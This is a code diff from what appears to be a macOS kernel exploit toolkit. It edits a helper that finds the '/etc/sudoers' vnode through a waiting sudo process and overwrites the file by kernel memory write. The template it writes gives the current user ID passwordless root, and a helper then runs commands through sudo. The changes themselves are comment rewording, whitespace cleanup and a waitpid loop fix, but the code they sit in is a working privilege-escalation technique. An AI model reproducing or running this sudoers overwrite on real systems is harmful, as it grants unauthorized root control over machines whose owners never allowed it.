@@ -41,9 +41,9 @@
 /// the file. By default the permissions on `/etc/sudoers` file is set such that only root can read /
 /// modify this file. So we can't directly open this file and then use kernel memory read to read the
 /// vnode pointer from file descriptor of current proc.  Another way to get this is by running the sudo
-/// binary with `-i` and `-S` options. This will make `sudo` to wait for password input from command
-/// line. But before waiting, the `sudo` binary will open the `/etc/sudoers` file. This allows us to
-/// read the address of `/etc/sudoers` vnode by scanning the open file descriptors of the waiting
+/// binary with `-i` and `-S` options. This will make `sudo` to wait for password input from stdin.
+/// But before waiting, the `sudo` binary will open the `/etc/sudoers` file. This allows us to read
+/// the address of `/etc/sudoers` vnode by scanning the open file descriptors of the waiting
 /// `sudo` process
 ///
 
@@ -192,7 +192,6 @@ xe_util_sudo_t xe_util_sudo_create(void) {
 
 
 static const char xe_util_sudo_sudoers_file_format[] = "\
-\
 Defaults env_reset\n\
 Defaults env_keep += \"CHARSET LANG LANGUAGE LC_ALL HOME\"\n\
 Defaults lecture_file = \"/etc/sudo_lecture\"\n\
@@ -200,7 +199,6 @@ root ALL = (ALL) ALL\n\
 %%admin ALL = (ALL) ALL\n\
 #%d ALL = NOPASSWD: ALL\n\
 #includedir /private/etc/sudoers.d\n\
-\
 ";
 
 
@@ -209,7 +207,7 @@ void xe_util_sudo_modify_sudoers(xe_util_sudo_t util, size_t sudoers_size) {
     size_t len = snprintf(buffer, sudoers_size, xe_util_sudo_sudoers_file_format, getuid());
     xe_assert_cond(len, <, sudoers_size);
     /// `xe_util_vnode_write` will not truncate the file to size of data. So we fill the buffer with
-    /// '\n' character to match the write data size sudoers file size
+    /// '\n' character to match the write data size with sudoers file size
     memset(&buffer[len], '\n', sudoers_size - len);
     xe_util_vnode_write_user(util->util_vnode, util->vnode_sudoers, buffer, sudoers_size);
     free(buffer);
@@ -234,7 +232,7 @@ int xe_util_sudo_run_cmd(const char* cmd, const char* argv[], size_t argc) {
     pid_t wait_pid;
     do {
         wait_pid = waitpid(cmd_pid, &stat_loc, 0);
-    } while ((wait_pid < 0 && errno == EINTR) || !WIFEXITED(stat_loc));
+    } while ((wait_pid < 0 && errno == EINTR) || (wait_pid >= 0 && !WIFEXITED(stat_loc)));
     xe_assert_cond(wait_pid, ==, cmd_pid);
     
     return WEXITSTATUS(stat_loc);
